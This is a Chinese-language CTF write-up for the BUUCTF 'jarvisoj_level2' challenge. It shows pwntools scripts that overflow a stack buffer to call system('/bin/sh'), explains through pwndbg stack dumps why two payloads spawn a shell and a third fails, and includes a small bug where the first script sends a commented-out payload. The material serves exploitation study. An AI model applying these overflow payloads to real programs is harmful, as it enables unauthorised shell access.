> 题目来源：BUUCTF-jarvisoj_level2
>
> 附件下载：
>
> 链接: [https://pan.baidu.com/s/1DS0_pY7o0A3lApgWYuFcPQ](https://pan.baidu.com/s/1DS0_pY7o0A3lApgWYuFcPQ)  密码: gb23
>
> --来自百度网盘超级会员V3的分享
>

调试环境：![](https://cdn.nlark.com/yuque/0/2020/png/574026/1608962007133-c7c15021-5c54-4a89-97bb-495b28eb2935.png)

<font style="color:#F5222D;">关闭系统的地址随机化</font>

在这道题目中，正确的payload有两种写法，如下：

```python
from pwn import *
context.log_level='debug'

p=process('./level2')

system_addr=0x0804845C
bin_sh_addr=0x0804A024
system_plt_addr=0x08048320
payload=(0x88+0x4)*'a'+p32(system_addr)+p32(bin_sh_addr)
#payload1=(0x88+0x4)*'a'+p32(system_plt_addr)+'bbbb'+p32(bin_sh_addr)
#error_payload=(0x88+0x4)*'a'+p32(system_addr)+'bbbb'+p32(bin_sh_addr)
gdb.attach(p)
#print payload
#print payload1
p.sendline(payload1)
p.interactive()
```

其中payload和payload1可以成功的getshell，但是error_payload无法成功getshell。

可以看到payload和error_payload具有相似的地方，payload1和error_payload具有相似的地方。但是千万不要将这三个payload搞混，这三个payload具有不同的含义。

先来解读一下这三个payload吧，不用管为什么要这样写，之后会说明。

```python
payload=(0x88+0x4)*'a'+p32(system_addr)+p32(bin_sh_addr)
```

第一个payload是输入大量字符之后让程序发生栈溢出的情况，让其返回地址变为system_addr，自然而然的后面的

“/bin/sh”就是system的参数（后面的动态调试会体现这一点）

请注意，这里的system_addr指的是程序代码段中的地址，而不是system_plt的地址：

```python
#是这个：
.text:0804845C                 call    _system
-----------------------------------------------------------------------------------
#不是这个：
.plt:08048320 ; int system(const char *command)
.plt:08048320 _system         proc near               ; CODE XREF: vulnerable_function+11↓p
.plt:08048320                                         ; main+1E↓p
.plt:08048320
.plt:08048320 command         = dword ptr  4
.plt:08048320
.plt:08048320                 jmp     ds:off_804A010
.plt:08048320 _system         endp
```

再来看一下第二个payload：

```python
payload1=(0x88+0x4)*'a'+p32(system_plt_addr)+'bbbb'+p32(bin_sh_addr)
```

这个payload就和第一个不相同，当程序发生栈溢出之后，程序会返回到system的plt，将'bbbb'做为调用system_plt函数后的虚假返回地址，参数就是“/bin/sh“。

看一下错误的payload：

```python
error_payload=(0x88+0x4)*'a'+p32(system_addr)+'bbbb'+p32(bin_sh_addr)
```

这个payload相当于将payload和payload1杂糅到了一起，写出这样子的payload应该是这样想的：

程序溢出之后将system作为返回地址，当call system时，它的参数是/bin/sh，并且将“bbbb”作为调用system函数后虚假的返回地址。

emmm...这个payload真的是你想象的这样吗？我们来动态调试一下：

首先关闭系统的地址随机化，防止堆栈地址随机，影响我们对比这三个payload的内存：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1608963429460-3bf76d4f-10b0-46b3-abdb-a81ee283413c.png)

之后，我们创建三个文件，将其分别命名为payload_exp.py、payload1_exp.py、error_exp.py，存放以下内容：

```python
from pwn import *
context.log_level='debug'

p=process('./level2')

system_addr=0x0804845C
bin_sh_addr=0x0804A024
system_plt_addr=0x08048320
payload=(0x88+0x4)*'a'+p32(system_addr)+p32(bin_sh_addr)
#payload1=(0x88+0x4)*'a'+p32(system_plt_addr)+'bbbb'+p32(bin_sh_addr)
#error_payload=(0x88+0x4)*'a'+p32(system_addr)+'bbbb'+p32(bin_sh_addr)
gdb.attach(p)
#print payload
#print payload1
p.sendline(payload)
p.interactive()
---------------------------------------------------------------------------------
from pwn import *
context.log_level='debug'

p=process('./level2')

system_addr=0x0804845C
bin_sh_addr=0x0804A024
system_plt_addr=0x08048320
#payload=(0x88+0x4)*'a'+p32(system_addr)+p32(bin_sh_addr)
payload1=(0x88+0x4)*'a'+p32(system_plt_addr)+'bbbb'+p32(bin_sh_addr)
#error_payload=(0x88+0x4)*'a'+p32(system_addr)+'bbbb'+p32(bin_sh_addr)
gdb.attach(p)
#print payload
#print payload1
p.sendline(payload1)
p.interactive()
---------------------------------------------------------------------------------
from pwn import *
context.log_level='debug'

p=process('./level2')

system_addr=0x0804845C
bin_sh_addr=0x0804A024
system_plt_addr=0x08048320
#payload=(0x88+0x4)*'a'+p32(system_addr)+p32(bin_sh_addr)
#payload1=(0x88+0x4)*'a'+p32(system_plt_addr)+'bbbb'+p32(bin_sh_addr)
error_payload=(0x88+0x4)*'a'+p32(system_addr)+'bbbb'+p32(bin_sh_addr)
gdb.attach(p)
#print payload
#print payload1
p.sendline(error_payload)
p.interactive()
```

复制粘贴到对应的文件，然后启动三个终端开始调试程序。现在三个exp都应该断在相同的位置，在我的机器上是断在了：

```python
 EIP  0xf7fd7fd9 (__kernel_vsyscall+9) ◂— pop    ebp
```

在三个gdb终端窗口中输入finish，直到程序的eip指向程序的代码段领空，现在三个的汇编如下：

```python
payload=(0x88+0x4)*'a'+p32(system_addr)+p32(bin_sh_addr)
```

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1608964283562-76524152-219d-4720-9626-3a4e715440c1.png)

```python
payload1=(0x88+0x4)*'a'+p32(system_plt_addr)+'bbbb'+p32(bin_sh_addr)
```

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1608964352477-c7ce2d35-a3a7-43f6-9481-9adc4a2d8874.png)

```python
error_payload=(0x88+0x4)*'a'+p32(system_addr)+'bbbb'+p32(bin_sh_addr)
```

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1608964388994-7f86cad9-bc23-44bd-b8d0-4be0edd5c88f.png)

---

现在，我们让所有程序单步到retn之后：

```python
payload=(0x88+0x4)*'a'+p32(system_addr)+p32(bin_sh_addr)
```

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1608964679917-525e74c3-3c1a-4aff-a933-a9a96e2e2329.png)

```python
payload1=(0x88+0x4)*'a'+p32(system_plt_addr)+'bbbb'+p32(bin_sh_addr)
```

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1608964712186-5642f72f-0980-4489-a9a5-94fe89cedcf0.png)

```python
error_payload=(0x88+0x4)*'a'+p32(system_addr)+'bbbb'+p32(bin_sh_addr)
```

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1608964731959-6a027d67-72dd-4743-8e07-169287e69b29.png)

---

从上面可以看到：

```python
payload=(0x88+0x4)*'a'+p32(system_addr)+p32(bin_sh_addr)
#payload的system参数为“/bin/sh”。
```

```python
payload1=(0x88+0x4)*'a'+p32(system_plt_addr)+'bbbb'+p32(bin_sh_addr)
#retn到system@plt
```

```python
error_payload=(0x88+0x4)*'a'+p32(system_addr)+'bbbb'+p32(bin_sh_addr)
#error_payload的system参数为“bbbb”，这也就是为什么error_payload无法getshell的原因。
```

现在的栈情况：

+ payload

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1608965252300-67161eed-c218-42a0-874b-e7cdb4e54d45.png)

+ payload1

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1608965301698-f82ecfee-ce77-48d3-9df2-4b2a1d391e22.png)

+ error_payload

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1608965323929-a76df14d-8f37-4c16-b525-e044ef426db4.png)

---

接下来将为payload和error_payload进行单步步入，payload1暂时不动：

```python
payload=(0x88+0x4)*'a'+p32(system_addr)+p32(bin_sh_addr)
```

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1608965614324-4384fcb8-b795-44d5-9534-5a8f0a0bfe99.png)

```python
payload1=(0x88+0x4)*'a'+p32(system_plt_addr)+'bbbb'+p32(bin_sh_addr)
```

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1608965654745-746dea0f-36a0-42a7-9cdc-d2c54fe01b93.png)

```python
error_payload=(0x88+0x4)*'a'+p32(system_addr)+'bbbb'+p32(bin_sh_addr)
```

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1608965682436-de32500d-bdab-42cb-8616-60abe9ca5b48.png)

从上面看到，三个payload已经执行到了相同的地方。

现将payload中的重要栈截取出来：（栈是由高地址向低地址生长的）

```python
payload=(0x88+0x4)*'a'+p32(system_addr)+p32(bin_sh_addr)
00:0000│ esp  0xffffd03c —▸ 0x8048461 (vulnerable_function+22) ◂— add    esp, 0x10
01:0004│      0xffffd040 —▸ 0x804a024 (hint) ◂— '/bin/sh'
02:0008│      0xffffd044 —▸ 0xffffd00a ◂— 0x61616161 ('aaaa')
03:000c│      0xffffd048 ◂— 0x0
04:0010│      0xffffd04c —▸ 0xf7e18647 (__libc_start_main+247) ◂— add    esp, 0x10
05:0014│      0xffffd050 —▸ 0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
... ↓
07:001c│      0xffffd058 ◂— 0x0
-----------------------------------------------------------------------------------
payload1=(0x88+0x4)*'a'+p32(system_plt_addr)+'bbbb'+p32(bin_sh_addr)
00:0000│ esp  0xffffd040 ◂— 0x62626262 ('bbbb')
01:0004│      0xffffd044 —▸ 0x804a024 (hint) ◂— '/bin/sh'
02:0008│      0xffffd048 ◂— 0xa /* '\n' */
03:000c│      0xffffd04c —▸ 0xf7e18647 (__libc_start_main+247) ◂— add    esp, 0x10
04:0010│      0xffffd050 —▸ 0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
... ↓
06:0018│      0xffffd058 ◂— 0x0
07:001c│      0xffffd05c —▸ 0xf7e18647 (__libc_start_main+247) ◂— add    esp, 0x10
-----------------------------------------------------------------------------------
error_payload=(0x88+0x4)*'a'+p32(system_addr)+'bbbb'+p32(bin_sh_addr)
00:0000│ esp  0xffffd03c —▸ 0x8048461 (vulnerable_function+22) ◂— add    esp, 0x10
01:0004│      0xffffd040 ◂— 0x62626262 ('bbbb')
02:0008│      0xffffd044 —▸ 0x804a024 (hint) ◂— '/bin/sh'
03:000c│      0xffffd048 ◂— 0xa /* '\n' */
04:0010│      0xffffd04c —▸ 0xf7e18647 (__libc_start_main+247) ◂— add    esp, 0x10
05:0014│      0xffffd050 —▸ 0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
... ↓
07:001c│      0xffffd058 ◂— 0x0
```

现在来解释一下payload1中为什么要加“bbbb”作为程序的虚假返回地址：

> 复习一下call的用法：
>
> 汇编语言中的call指令相当于：push call指令的下一条指令，jmp call指令单步步入的地址。
>

我们可以将payload和payload1联系起来这样理解：

当payload单步步入call system的内部之后，系统会自动将call system的下一条指令也就是“add    esp, 0x10”push到栈中，然后jmp到了system@plt。payload1是直接跳转到了system@plt处，对比payload相当于少了一个push，因此为了保证程序不会发生异常，我们需要在payload1中添加一个“bbbb”作为程序的虚假返回地址来保证栈的平衡。

> 这里无需考虑栈的地址不相同，只需考虑栈的结构相同即可
>

```python
payload
0xffffd03c —▸ 0x8048461 (vulnerable_function+22) ◂— add    esp, 0x10
0xffffd040 —▸ 0x804a024 (hint) ◂— '/bin/sh'
0xffffd044 —▸ 0xffffd00a ◂— 0x61616161 ('aaaa')
payload1:
0xffffd040 ◂— 0x62626262 ('bbbb') #添加“bbbb”以当作返回地址来确保栈的平衡
0xffffd044 —▸ 0x804a024 (hint) ◂— '/bin/sh'
0xffffd048 ◂— 0xa /* '\n' */
```

到这里，关于三个payload的疑惑就说明完了。但是我想知道error_payload究竟在哪里出现了崩溃，以及调用system时系统是如何调用其参数的。

经过一番调试，发现system最终调用了execve函数，对execve下断点，继续调试三个payload：

```python
pwndbg> b execve
Breakpoint 1 at 0xf7eb08c0: file ../sysdeps/unix/syscall-template.S, line 84.
pwndbg> 
```

现在三个payload都来到了：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1608968060414-fcd201c1-7279-4d54-a28b-76902ae17315.png)

所有都单步步入<execve+18>    call   dword ptr gs:[0x10]

再次单步到sysenter  <SYS_execve>，三个payload都是如下图所示：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1608968211085-1558d7c4-61d2-451d-986c-de8913559b13.png)

当payload和payload1再次单步之后，会进入：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1608968319863-c5a31917-d37d-4352-b313-e2152d09f82b.png)

到达/bin/dash领空：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1608968542741-d4a9d8c8-5bc5-463e-aeb1-51c11a5ae131.png)

再次进行单步调用syscall后直接getshell，丢失调试目标，无法继续追踪，而关于system（text段）怎么调用“/bin/sh”这个参数就无从得知了。并且error_payload无法单步步入：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1608968482729-d688da87-140d-4f84-9f21-bf4131c6257b.png)

其返回值为EAX：0xfffffff2，直接到达pop ebp处，无法进入sysenter。原因也无从得知。

猜测：

system最终传入的参数最终应该是由内核进行调用，至于在哪里进行调用，由于不会内核调试，这个问题暂不解决。

